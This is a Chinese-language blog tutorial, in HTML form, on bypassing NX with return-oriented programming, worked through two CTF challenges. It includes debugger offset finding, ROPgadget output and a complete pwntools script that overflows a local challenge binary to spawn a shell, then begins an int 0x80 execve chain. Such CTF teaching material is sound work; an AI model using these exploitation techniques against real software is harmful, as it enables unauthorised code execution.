@@ -1,0 +1,1183 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="PWN,CTF,ROP," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Hvnt3r's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="二进制安全之NX绕过方法–ROP技术在之前的缓冲区溢出的实验中，溢出到栈中的shellcode可以直接被系统执行，给系统安全带来了极大的风险，因此NX技术应运而生，该技术是一种在CPU上实现的安全技术，将数据和命令进行了区分，被标记为数据的内存页没有执行权限，因此即使将恶意shellcode写入到执行流程中也会因缺少执行权限而利用失败，在一定程度上提高了系统的安全性，但是所有安全都是绝对的，一种名">
+<meta name="keywords" content="PWN,CTF,ROP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="二进制安全之NX绕过方法--ROP">
+<meta property="og:url" content="https://hvnt3r.top/2018/10/二进制安全之ROP/index.html">
+<meta property="og:site_name" content="Hvnt3r&#39;s Blog">
+<meta property="og:description" content="二进制安全之NX绕过方法–ROP技术在之前的缓冲区溢出的实验中，溢出到栈中的shellcode可以直接被系统执行，给系统安全带来了极大的风险，因此NX技术应运而生，该技术是一种在CPU上实现的安全技术，将数据和命令进行了区分，被标记为数据的内存页没有执行权限，因此即使将恶意shellcode写入到执行流程中也会因缺少执行权限而利用失败，在一定程度上提高了系统的安全性，但是所有安全都是绝对的，一种名">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://i.loli.net/2018/10/24/5bd04ad656935.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/24/5bd04ba0a065f.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd12fec4d9a7.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/24/5bd04fd9d3ed6.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/24/5bd053257fdc5.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/24/5bd0656667462.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/24/5bd065cbcf9e8.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/24/5bd0681883c81.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd19be503ced.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd19cd6d73dd.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd1ab13b260b.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd1b4fd1eaaa.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/29/5bd66176beb5e.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/29/5bd671a95392d.png">
+<meta property="og:updated_time" content="2018-10-29T08:27:17.418Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="二进制安全之NX绕过方法--ROP">
+<meta name="twitter:description" content="二进制安全之NX绕过方法–ROP技术在之前的缓冲区溢出的实验中，溢出到栈中的shellcode可以直接被系统执行，给系统安全带来了极大的风险，因此NX技术应运而生，该技术是一种在CPU上实现的安全技术，将数据和命令进行了区分，被标记为数据的内存页没有执行权限，因此即使将恶意shellcode写入到执行流程中也会因缺少执行权限而利用失败，在一定程度上提高了系统的安全性，但是所有安全都是绝对的，一种名">
+<meta name="twitter:image" content="https://i.loli.net/2018/10/24/5bd04ad656935.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://hvnt3r.top/2018/10/二进制安全之ROP/"/>
+
+
+
+
+
+  <title>二进制安全之NX绕过方法--ROP | Hvnt3r's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband">
+	<a href="https://github.com/Hvnt3r"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_gray_6d6d6d.png" alt="Fork me on GitHub"></a>
+	</div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta custom-logo">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hvnt3r's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">让我们来猎杀那些陷入黑暗中的人吧-Shauna Vayne</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主🐷页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            主🐷页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我😎">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我😎
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签👀">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签👀
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类👅">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类👅
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-所有文章📖">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            所有文章📖
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-友情链接👥">
+          <a href="/friends/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
+            
+            友情链接👥
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hvnt3r.top/2018/10/二进制安全之ROP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Hvnt3r">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hvnt3r's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">二进制安全之NX绕过方法--ROP</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-24T10:20:05+08:00">
+                2018-10-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/二进制安全/" itemprop="url" rel="index">
+                    <span itemprop="name">二进制安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/10/二进制安全之ROP/" class="leancloud_visitors" data-flag-title="二进制安全之NX绕过方法--ROP">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+				 <span>°C</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  3.9k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  18
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="二进制安全之NX绕过方法–ROP技术"><a href="#二进制安全之NX绕过方法–ROP技术" class="headerlink" title="二进制安全之NX绕过方法–ROP技术"></a>二进制安全之NX绕过方法–ROP技术</h1><p>在之前的缓冲区溢出的实验中，溢出到栈中的<code>shellcode</code>可以直接被系统执行，给系统安全带来了极大的风险，因此<code>NX</code>技术应运而生，该技术是一种在CPU上实现的安全技术，将数据和命令进行了区分，被标记为数据的内存页没有执行权限，因此即使将恶意<code>shellcode</code>写入到执行流程中也会因缺少执行权限而利用失败，在一定程度上提高了系统的安全性，但是所有安全都是绝对的，一种名为ROP（Return-Oriented Programming）的技术就能绕过这项安全措施，ROP的核心思想是利用<code>ret</code>，<code>jmp</code>，<code>call</code>等指令（主要是<code>ret</code>）来连接代码的上下文从而改变程序执行流程的一项技术，由于ret指令的功能是将当前的栈顶数据弹出到<code>EIP</code>中并跳转执行，我们可以在栈中精心构造一些以<code>ret</code>结尾的特殊指令（gadget）使系统跳转到我们在栈中放置的指令的位置，进而执行这些指令，达到攻击的效果。</p>
+<a id="more"></a>
+<h2 id="64位ELF的ROP"><a href="#64位ELF的ROP" class="headerlink" title="64位ELF的ROP"></a>64位ELF的ROP</h2><p>先拿一道<code>bugs bunny ctf 2017</code>的<code>pwn150</code>来说：</p>
+<p><a href="https://pan.baidu.com/s/1vWo03QA2ueqN9-uzgpJaXQ" target="_blank" rel="noopener">题目下载</a></p>
+<p>这是一个64位的ELF文件且程序开启了NX：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd04ad656935.png" alt=""></p>
+<p>放到IDA里可以很容易发现<code>Hello()</code>函数中存在溢出漏洞：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd04ba0a065f.png" alt=""></p>
+<p>现看一下溢出的情况，可以使用IDA的远程调试来看看再发生溢出后寄存器的数据，<a href="https://hvnt3r.top/2018/10/IDA-Pro%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/">IDA远程调试教程</a></p>
+<p>点击运行程序，向程序中输入如下字符串：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_creat 150</span><br><span class="line"><span class="string">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2018/10/25/5bd12fec4d9a7.png" alt=""></p>
+<p>回车之后IDA报错，段错误，查看此时寄存器中的数值：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd04fd9d3ed6.png" alt=""></p>
+<p>栈内数据如下：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd053257fdc5.png" alt=""></p>
+<p>此时RSP寄存器中的值为<code>41416741414B4141</code>，ASCII转化一下就是<code>AAgAAKAA</code>，按照存储方式倒序就是<code>AAKAAgAA</code>，查看偏移量为88：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_offset AAKAAgAA</span><br><span class="line">AAKAAgAA found at offset: 88</span><br></pre></td></tr></table></figure>
+<p>至此我们找到了到达RSP的距离，如果想实现<code>system(&quot;/bin/sh&quot;)</code>起shell还需要找到<code>system()</code>函数的位置和字符串<code>/bin/sh</code>，和一个<code>gadget</code>，<code>gadget</code>是指程序中我们可以利用的代码片段，由于本程序为64位程序，在运行时与32位程序不同，64位程序的前六个整型或指针参数依次保存在<code>RDI</code>，<code>RSI</code>， <code>RDX</code>，<code>RCX</code>，<code>R8</code>和<code>R9</code>这六个寄存器中，多出来的参数才会入栈，因此我们按照<code>ROP</code>的思路，需要找到的<code>gadget</code>为<code>pop rdi , ret</code></p>
+<p><code>system()</code>的位置可以在<code>main</code>函数中的一个<code>today()</code>中找到：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400756</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000400756</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000400757</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">000000000040075</span>A                 mov     edi, offset command ; <span class="string">"/bin/date"</span></span><br><span class="line">.text:<span class="number">000000000040075F</span>                 call    _system</span><br><span class="line">.text:<span class="number">0000000000400764</span>                 nop</span><br><span class="line">.text:<span class="number">0000000000400765</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">0000000000400766</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400766</span> ; &#125; <span class="comment">// starts at 400756</span></span><br><span class="line">.text:<span class="number">0000000000400766</span> today           endp</span><br><span class="line">.text:<span class="number">0000000000400766</span></span><br></pre></td></tr></table></figure>
+<p>地址为<code>000000000040075F</code></p>
+<p><code>/bin/sh</code>可以在Hello的输出语句的<code>shorry</code>中找到一个<code>sh</code></p>
+<p><img src="https://i.loli.net/2018/10/24/5bd0656667462.png" alt=""></p>
+<p>地址为<code>00000000004008fb</code></p>
+<p>本来还想着这里怎么打错了，原来是留了后门啊，也可以在函数名中找到：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd065cbcf9e8.png" alt=""></p>
+<p>地址为<code>00000000004003ef</code></p>
+<p>寻找目标<code>gadget</code>可用此程序：<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">ROPgadget</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@kali ROPgadget --binary pwn150 | grep <span class="string">"pop rdi"</span></span><br><span class="line">0x0000000000400883 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
+<p>找到了以上的地址，可以构造脚本了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding:utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.update(arch = &apos;amd64&apos;, os = &apos;linux&apos;, timeout = 1)</span><br><span class="line"></span><br><span class="line">io = process(&quot;./pwn150&quot;)</span><br><span class="line"></span><br><span class="line">system = 0x40075f</span><br><span class="line">binsh = 0x4003ef</span><br><span class="line">pop_rdi_ret = 0x400883  </span><br><span class="line"></span><br><span class="line">payload=&quot;A&quot;*88</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(binsh)</span><br><span class="line">payload+=p64(system)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2018/10/24/5bd0681883c81.png" alt=""></p>
+<p>漏洞利用成功，再解释一下为什么 要这样构造脚本：</p>
+<p>首先发送了88个字节填充无用空间，在88个字节之后的数据<code>gadget</code>会存储在ESP所指的内存区域，此时系统会执行<code>gadget</code>的指令<code>pop rdi ; ret</code>，<code>rsp+8</code>，通过<code>pop rdi</code>将<code>/bin/sh</code>弹出到RDI寄存器中，<code>rsp+8</code>，<code>rsp</code>此时指向<code>system()</code>，之后会执行<code>ret</code>，因为此时RSP指向<code>system()</code>，系统会调用<code>system()</code>函数并将<code>rdi</code>中的值作为参数传到<code>system()</code>中从而执行<code>system(&quot;/bin/sh&quot;)</code></p>
+<h2 id="无system函数时调用int-0x80完成ROP"><a href="#无system函数时调用int-0x80完成ROP" class="headerlink" title="无system函数时调用int 0x80完成ROP"></a>无system函数时调用<code>int 0x80</code>完成ROP</h2><p>上文中的例子是程序中有system函数调用的情况，但是如果程序中没有system函数的调用应该怎么办呢？</p>
+<p>我们可以使用<code>int 0x80</code>来进行系统中断</p>
+<blockquote>
+<p>启动系统调用需要使用<code>INT</code>指令。<code>linux</code>系统调用位于中断<code>0x80</code>，执行<code>INT</code>指令时，所有操作转移到内核中的系统调用处理程序，完成后执行转移到<code>INT</code>指令之后的下一条指令。操作系统实现系统调用的基本过程是：</p>
+<ul>
+<li>应用程序调用库函数（API）；</li>
+<li>API将系统调用号存入EAX，然后通过中断调用使系统进入内核态；</li>
+<li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li>
+<li>系统调用完成相应功能，将返回值存入EAX，返回到中断处理函数；</li>
+<li>中断处理函数返回到API中；</li>
+<li>API将EAX返回给应用程序。</li>
+<li>寄存器<code>eax</code>存放调用号，剩下的几个寄存器存放参数。</li>
+</ul>
+</blockquote>
+<p>拿<code>Tamu CTF 2018</code>的<code>pwn5</code>来说：</p>
+<p><a href="https://pan.baidu.com/s/1EoQurswVJNR4siSFvC_KBg" target="_blank" rel="noopener">题目下载</a></p>
+<p>看一下开启的安全措施:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>
+<p>IDA看一下:</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd19be503ced.png" alt=""></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">first_day_corps</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"You wake with a start as your sophomore yells \"Wake up fish %s! Why aren't you with your buddies in the fallout hole?\"\n"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"As your sophomore slams your door close you quickly get dressed in pt gear and go to the fallout hole."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You spend your morning excersizing and eating chow."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Finally your first day of class begins at Texas A&amp;M. What do you decide to do next?(Input option number)"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1. Go to class.\n2. Change your major.\n3. Skip class and sleep\n4. Study"</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  result = (<span class="keyword">char</span>)getchar();</span><br><span class="line">  <span class="keyword">if</span> ( result == <span class="number">50</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You decide that you are already tired of studying %s and go to the advisors office to change your major\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"What do you change your major to?: "</span>);</span><br><span class="line">    result = change_major();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( result &gt; <span class="number">50</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">51</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="built_in">puts</span>(</span><br><span class="line">                 <span class="string">"You succumb to the sweet calling of your rack and decide that sleeping is more important than class at the moment."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( result == <span class="number">52</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(</span><br><span class="line">        <span class="string">"You realize that the corps dorms are probably not the best place to be studying and decide to go to the library"</span>);</span><br><span class="line">      result = <span class="built_in">printf</span>(</span><br><span class="line">                 <span class="string">"Unfortunately the queitness of the library works against you and as you are studying %s related topics "</span></span><br><span class="line">                 <span class="string">"you start to doze off and fall asleep\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( result == <span class="number">49</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You go to class and sit front and center as the Corps academic advisors told you to do."</span>);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">"As the lecturer drones on about a topic that you don't quite understand in the field of %s you feel yourself begin"</span></span><br><span class="line">      <span class="string">"ning to drift off.\n"</span>);</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"You wake with a start and find that you are alone in the lecture hall."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这道题的英文部分是真的多，分析一圈下来发现这些都是些没有什么作用的输出语句，漏洞存在于<code>change_major()</code>函数：<br><img src="https://i.loli.net/2018/10/25/5bd19cd6d73dd.png" alt=""></p>
+<p>找到漏洞之后我们可以构造ROP了，由于这个程序中没有system函数，我们需要找到<code>int 0x80</code>系统中断，可用<code>ROPgadget</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@kali ROPgadget --binary pwn5 | grep <span class="string">"int 0x80"</span></span><br><span class="line">0x08071003 : add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x08071001 : add dword ptr [eax], eax ; add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x08071005 : int 0x80  //  &lt;=======这里</span><br><span class="line">0x08070ffe : invd ; mov eax, 1 ; int 0x80</span><br><span class="line">0x0807ed3a : ja 0x807ed40 ; add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x080bb0a6 : js 0x80bb0b0 ; int 0x80</span><br><span class="line">0x080bb172 : js 0x80bb17b ; int 0x80</span><br><span class="line">0x08070ffc : lock or dword ptr [edi], ecx ; or byte ptr [eax + 1], bh ; int 0x80</span><br><span class="line">0x0807ed39 : mov eax, 0x77 ; int 0x80</span><br><span class="line">0x0807ed30 : mov eax, 0xad ; int 0x80</span><br><span class="line">0x08071000 : mov eax, 1 ; int 0x80</span><br><span class="line">0x0807398f : nop ; int 0x80</span><br><span class="line">0x0807ed2f : nop ; mov eax, 0xad ; int 0x80</span><br><span class="line">0x0807398e : nop ; nop ; int 0x80</span><br><span class="line">0x0807398c : nop ; nop ; nop ; int 0x80</span><br><span class="line">0x0807398a : nop ; nop ; nop ; nop ; int 0x80</span><br><span class="line">0x08073988 : nop ; nop ; nop ; nop ; nop ; int 0x80</span><br><span class="line">0x0807ed37 : nop ; pop eax ; mov eax, 0x77 ; int 0x80</span><br><span class="line">0x08070fff : or byte ptr [eax + 1], bh ; int 0x80</span><br><span class="line">0x08070ffd : or dword ptr [edi], ecx ; or byte ptr [eax + 1], bh ; int 0x80</span><br><span class="line">0x0807ed38 : pop eax ; mov eax, 0x77 ; int 0x80</span><br><span class="line">0x080bb0a7 : push es ; int 0x80</span><br></pre></td></tr></table></figure>
+<p>找到int 8后需要找到执行系统调用的函数，在<a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">http://syscalls.kernelgrok.com/ </a>上有详细的参数，我们要调用<a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html" target="_blank" rel="noopener"><br>sys_execve</a> ：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">"/bin/sh"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>系统调用号<code>eax</code>应该为<code>0xb</code></li>
+<li>第一个参数<code>ebx</code>应该指向<code>/bin/sh</code>的地址，或者指向<code>sh</code>的地址</li>
+<li>第二个参数<code>ecx</code>应该为0</li>
+<li>第三个参数<code>edx</code>应该为0</li>
+</ul>
+<p>因此我们需要找到控制这几个寄存器的<code>gadget</code>如<code>pop eax ; pop ebx ; pop ecx ; pop edx ; ret</code></p>
